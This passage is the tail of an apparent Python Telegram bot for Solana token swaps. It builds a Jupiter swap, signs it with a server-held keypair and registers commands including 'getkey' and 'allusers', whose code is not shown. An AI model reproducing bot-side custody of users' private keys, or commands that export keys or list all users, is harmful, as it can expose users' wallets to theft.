    await ctx.bot.send_message(chat_id, "⏳ Building transaction...")

    swap_data = await jupiter_swap(quote, entry["pubkey"])
    if not swap_data or "swapTransaction" not in swap_data:
        await ctx.bot.send_message(chat_id, "❌ Failed to build swap transaction.")
        return

    from solders.transaction import VersionedTransaction
    from solana.rpc.types import TxOpts

    raw_tx    = base64.b64decode(swap_data["swapTransaction"])
    tx        = VersionedTransaction.from_bytes(raw_tx)
    signed    = kp.sign_message(bytes(tx.message))
    signed_tx = VersionedTransaction.populate(tx.message, [signed])

    async with AsyncClient(RPC_URL) as client:
        resp = await client.send_raw_transaction(
            bytes(signed_tx),
            opts=TxOpts(skip_preflight=False, preflight_commitment="confirmed"),
        )

    sig = str(resp.value)
    await ctx.bot.send_message(
        chat_id,
        f"✅ *Swap submitted!*\n\n[View on Solscan](https://solscan.io/tx/{sig})",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(),
    )

# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    start))
    app.add_handler(CommandHandler("getkey",   getkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    logger.info("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
